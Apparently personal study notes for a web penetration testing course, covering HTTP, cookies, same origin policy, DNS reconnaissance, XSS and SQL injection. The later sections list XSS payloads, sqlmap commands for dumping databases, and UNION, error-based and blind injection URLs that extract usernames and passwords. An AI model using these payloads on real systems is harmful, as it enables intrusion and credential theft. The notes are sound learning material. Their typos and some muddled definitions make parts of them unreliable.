
1. if the cookie is having httponly flag set to true then this cookie is not accesible by javascript

2. HTTP Header  :
	\r (carriage return) : moves the cursor to the begining of the line 
	\n (line feed) : move the cursor to the next line 
	\r\n : same function as ENTER

3.request-type : is also known as HTTP verb 

4. Accept column in HTTP header : It is used by the browser to specify which documnet type is expected to be returned as a result of request.

5. The Accept-Encoding is similar to accept, but it restrics the content codings that are acceptable in the reponse. content coding are primarily used to allow a document to be compressed or transformed without losing the identity of its media type and without loss of information. 

6. The Cache-Header allow the brower and the server to agree about caching rules. Cached Contents save bandwidth because, in short, they prevent your browser from re-requesting contents that have not changed when the same resource is to be used. 

7. The Server header displays the web server banner 



####################      Encoding    ###################### 

   
8. Charset : it contain a set of characters : they represent the set of all symbols that the end user can display in their browser window. in technical teminology, a charset consists of pairs of symbols and code point. 

9. the symbol is what the user reads as he see on the screen 

10. code point is the numerical index 

11. UTF : Unicode Transformation Format 

12. HTML Entities : is simply a string (starting with & and &# and ending with ; ) that corresponds with a symbol. it will not interpret this as a HTML code. 

13. Base64 : It is a binary to text encoding schema used to convert binary files and send them over internet.  


####################     Same Origin Policy    #################

14. Same Origin Policy : This policy prevent a script or a document from getting or setting properties of another document that comes from different origin. 

15. The Same Origin Policy (SOP) Prevents Javascript, running on a given origin, from interacting with a document from a different origin. The Primary purpose of SOP is to isolate requests coming from different Origin. 

16. the "window.Location" object can be used to get the current page address (URL) and to redirect the browser to a new page.

17. Each Document can write the location propery but cannot read it. This means that the location property can always be changed.

18. location property work when thier is typical relationship : a document is embedded within another via an iframe element, one document is opened by the other via window.open() DOM API.

19. document.domain : This property descibes the domain portion of the origin of the current document.

20. HTML5 feature "Cross Window Messaging" permit different documents(iframes, popups, current window) to communicate with each other regardless of the same origin policy by using a simple synchronous mechanism. 

21. "Cross Origin Resource Sharing (CORS)" : It is a set of specific built to allow a browser to access a few resource by bypassing the SOP 

###################  COOKIES ############### 

22. Cookie Jar : It is the storage space where a web browser store the cookie. 

23. if the server does not specify the domain attribute, the browser will automatically set the domain as the server domain and the cookie "host-only" flag. This means that the cookie will be sent "only to the precise hostname".

24. The "HttpOnly flag" is used to force the browser to send the cookie only through HTTP. this flag prevents the cookie from being read by the javascript , flash, java, and any other HTML technology. This is the protection mechanism against cookie stealing via XSS.

25. The "Secure Flag" force the browser to send the cookie only through HTTPS . This prevent the cookie from being send into clear text. 

26. There are three different cookie Domain : 
	- Specified cookie Domain 
 	- unspecified cookie domain 

27. 1. Cookie Domain value = target Domain
    2. Cookie Domain value different  from target Domain AND Cookie domain value is a suffix of the target Domain. 

28. Security Implication : 
	lower-level Subdomain can set cookies for higer domain. Indeed b.a.elswapt.site can set a cookie for a.elswapt.site or elswapt.site. 
	higer domain cannot set cookies for lower-level subdomains. elswapt.site cannot set cookies for anysubdomain.elswapt.site

29. Unspecified Cookie Domain : When a cookie does not contain a domain value, it is assumed that the "host-only flag" is set to true.

30. Internet Explorer Exception : Cookies with unspecific Domain values will be interpreted by the browser as if they had a domain value corresponfing to the target domain set it in. 

31. HTTP Session are a simple mechanism  that allows website to store variables specifi for a given visit on the server. 

32. The Main Difference between cookie and session id is that cookie is store at the client side whereas the session id is store at the Server side.

##################           INFORMATION GATHERING      #########################	
 
33. use WHOIS database to gather information. 

34. A "Resource Record" starts with a domain name, usually a fully qualified domain name. 
    "Start of Authority" Indicate the beginning of a zone and it should occur first at zone time.
    "Name Server" NS Record are the GLUE that Binds the distributed Database Together. 
    -> A : the "A" record simple maps a hostname to a IP address. Zone with "A" record are called 'Forward' zones
    -> PTR : "pointer" : the "PTR" record maps an IP address to a hostname.zone with PTR record are called 'reverse' zones. 
    -> CNAME : The Cname record maps an alias hostname to an A record hostname.
    -> MX : The MX record specifies a host that will accept emails on behalf of a given host.

35. The nameserver is the DNS server that replies to all lookup queries regarding the namespaces of a Domain.

36. By Using "netcat" we can establish a connection to the web server and look at the server field in the HTTP response header. 

37. "Whatweb" : It is a command Line Tool that can be used to recognize website technologies, Web Server, version, Blogging Platform, JS Libraries etc.

 -------------------- Enumerating Subdomains ------------------------

38. Tools : 1. Netcraft 
	    2. Google (site:.microsoft.com) 
	    3. theharvester
	    4. subbrute : ./subbrute.py cbs.com  
	    5. dnsrecon
	    6. dnsenum : dnsenum -p 20 -s 100 --thread 5 cbs.com 
	    
39. "TheHarvester" is a tool for gathering subDomain names from different public source such as search engines of PGP key server 

40. Enumerating Subdomain using ZONE TRANSFER

41. "A Zone Transfer is a term used to refer to the process by which the content of the DNS Zone file are copied from Primary DNS Server to Secondary DNS Server."

42. "dig" is used for Zone Transfer 
	dig @nameserver axfr mudomain.com 
	axfr is a mnemonic opcode for the DNS Zone Tranfer 
	
43. A "Virtual Host" is Simply a website that shares an IP address with one or more other virual Host. 

44. The "meta" HTML tags are used to add metadata information to a web page. This data is usually read by the search engine to better index the web page. Meta redirect, instead, is a way to generate after X second or immediate if X = 0.

45. " Crawling the Website "  : Crawling a website is the process of browsing a website in a methodical or automated manner to enumerate all the resources encountered along the way. It gives us the stuctured of the website we are auditing and an overview of the potential attack surface. A crawler find files and folder in website because these appear in web pages, links, comments and forums. 
    	
46. Crawler will only enumerate publicly available resources found through the links and forms.       

47. Shodan HQ : Instead of Crawing data in Web pages, Shodan scan the entire internet and interrogates ports in order to gather information from the the banners. 


##########################  CROSS SITE SCRIPTING  ##############################


48. $_GET variable stores the <parameter,value> pairs passes through the HTTP GET method. 
	
49. GET is the method used when clicking links or directly typing the website URL you want to browse in your browser location bar. 
    ?name=MyName is called "querystring"

50. Cross-Site Scripting attacks are possible when the user input is used somewhere on the web application output this let an attacker to get control over the content rendered to the application users thus attacking the users themselves. 

51. The three types of XSS : 1. Reflected XSS  2. Stored XSS  3. DOM XSS

52. Reflected XSS : It Occurs when untrusted user data is sent to a web application, and it is immediately echoed back as the untrusted Content. This Type of vulnerability deals with the server-side code.

53. Persistence (or Stored ) XSS flaws are similar to Reflected XSS; rather than the malicious input being directly reflected into the response, it is stored withih the web application. 

54. DOM XSS : It is a form of cross site scripting that exits within client side code. This vulnerability live within the DOM environment, thus within a page's client-side script itself and does not reach server side code. 

55. DOM : Document Object Module is the object built by the web browser upon parsing the web page content provided by the server. 

56. Keep in mind that XSS is the injection of HTML and/or Javascript; therefore, at first, you will want to use simple paylaod like <plaintext>. This Special HTML tag instruct the browser to treat the remaining web page source as a plain text, thus breaking the appearance of the site. 
 
57. XSS payloads : 
	<img src="logo.png" alt=""><script> alert("XSS")</script>">
	<img src="logo.png" alt=""><body onload="alert('XSS Example')"> 
	<img src="logo.png" alt="" onload="javascript:alert('XSS')">
	http://victim.site/index.php?name=" onload="javascript:alert('XSS EXAMPLE')
	http://victim.site/index.php?name=" onload="alert('XSS Example') 
	<img src="logo.png" alt=" onload="alert(String.fromCharCode(88,83,83))

58. Defaced : We basically replace the current content with our own.

#### Beef : Browser Exploitation Framework 

######################  Mitigation ########################

59. Input Validation, Context-aware output encoding : to correctly and safely render user's content on the web application pages. 

#####################   SQL Injection ######################

Inband SQL Injection leverage the same channel used to inject the SQL code (i.e the pages generated by the web application) 
	
During an "Error Based SQL Injection attack" , the penetration tester finds a way to ask the web application for the desired information. 

A Web application vulnerable to "blind SQL injection" does not reflect the results of the injection on the output. in this case, the penetration tester must find an "inference" methods to exploit the vulnerability. 

Inference Exploitation is basically carried out mostly by using true/false condition. 

Finding SQL Injection : 

Input parameter are carried through GET and POST requests, HEADERS and COOKIES So, we have to check all the channels where data is retrieved from the client. 

Security through obsecurity is the use of secrecy of Design implementation or configuration in order to provide security. 

   
60. sqlmap Ussage : 
	-u : for url 
	--data : to specify the  content of the hTTP post request 
	-p : parameter 
	technique : 
	--technique=U : UNION Based 
	--technique=B : Boolean based 
	command : 
	sqlmap -u 'http://sqlmap.test/search.php?search=n' -p search --technique=U --banner -v3 --fresh-querys
	sqlmap -u 'https://sqlmap.test/search.php?search=n' -p search --technique=U --users
	sqlmap -u 'https://sqlmap.test/search.php?search=n' -p search --technique=U --dbs
	sqlmap -u 'https://sqlmap.test/search.php?search=n' -p search --technique=U -D [database] --tables
	sqlmap -u 'https://sqlmap.test/search.php?search=n' -p search --technique=U -D [database] -T [table_name] --columns
	-> sqlmap -u 'https://sqlmap.test/search.php?search=n' -p search --technique=U -D [database] -T [table_name] -C [columns]
	-> sqlmap -u http://sqlmap.test/login.php --data='user=a&pass=b' -p user --technique=B --banner 

Note : We can save the intercepted request using burp and we can use this file with sqlmap to check save this file with ".req" extension. 
	-> sqlmap -r /root/saved_file.req -p user --technique=B --banner 
Note Sqlmap saves the information on the target logs extracted data .... if you want a fresh start we can flush the session we can do that by appending --flush-session 
	-> sqlmap -r /root/saved_file.req -p user --technique=B -v3 --flush-session 


61. Finding SQL Injection : check all the parameter with passing "'" or some payload to check the behaviour of the web application. 

62. Exploiting Inband SQL injection : 
	Theory : 
	In band SQL Injection technique makes the retrieval of data from the database very powerful thnk to the use of the UNION Sql Command. In-band SQL injection is also known as UNION based SQL injection.  
	
	first use single quote ' if this doesn't work 
	second use Boolean expression :   200' and 'a'='a 		
	next use union query as : 

	-> http://site.com/page.php?id=200' UNION SELECT null;-- -
   	-> http://site.com/page.php?id=200' UNION SELECT null,null;-- -
   	-> http://site.com/page.php?id=200' UNION SELECT null,null,null;-- -
   	
	Now we start to find the Data type used in the column : 
	
	http://site.com/page.php?id=200' UNION SELECT 'else1',null,null;-- -  : this will return true if the column one is of data type string . 
	Many version show the version of the DBMS using @@version 
	-> http://site.com/page.php?id=200' UNION SELECT @@version,'els2',null;-- -
   	
63. Exploiting Error Based SQL injection : 
	we will inject invalid commands on web application queries to extract information about the DBMS and the database it hosts.
	Error Based SQL injection is one of the fastest ways to extract data from a data base. It is available on DBMSs Such as Oracle, PostgreSQL, MS SQL etc.    
	The CAST technique : 
	99999 or 1 in (SELECT TOP 1 CAST(<FIELDNAME> as VARCHAR(4026)) FROM <TABLENAME> WHERE <FIELDNAME> NOT IN (<LIST>)); --
	-> This is the part of the SQL that will trigger the error. 
	-> We are Asking the Database to look for integer value 1 within a VARCHAR COLUMN. 

	In this type we can compare string with a integer which through back an error and show what is the string and in plac of string we can use @@version  which will compare version string with integer. 
	-> http://site.com/page.php?id=1 or @@version=1);--
	Use parentheses some time the query will be (id=1) So we need to close the parameter using )
	To extract the current database name use : 
	-> http://site.com/page.php?id=1 or db_name()=1);-- 
	
	these query will throw a error and in error this will give you the name of the database. 
	to get all the database name use the below query : 
	-> http://site.com/page.php?id=1 or db_name(0)=1);-- : gives you first database name 
	-> http://site.com/page.php?id=1 or db_name(1)=1);-- : gives you second database name 
	-> http://site.com/page.php?id=1 or db_name(2)=1);-- : gives you third database name 
	and so on ... 

	To get all the username use the below query : 
	-> http://site.com/page.php?id=1 or user_name(0)=1);-- : gives you the first username 
	and so on ...
	
64. Exploiting Bind SQL Injection : 
	Use the BlindSql.sh script 
	This Command is used to enumerate table_name;
	bash blinSql.sh 20 "SELECT table_name FROM information_schema.tables WHERE table_schema='motville' limit 1,1"

	This is command is used to enumerate Columns : 	
	bash blindSql.sh 20 "Select colum_name form information_schema.column WHERE table_name='accounts' limit 0,1" 
	This command with concatinate the username and password and print the first pair : 
	bash blindSql.sh 25 "concat(username,'----',password) from accounts limit 0,1"
		 
		
	

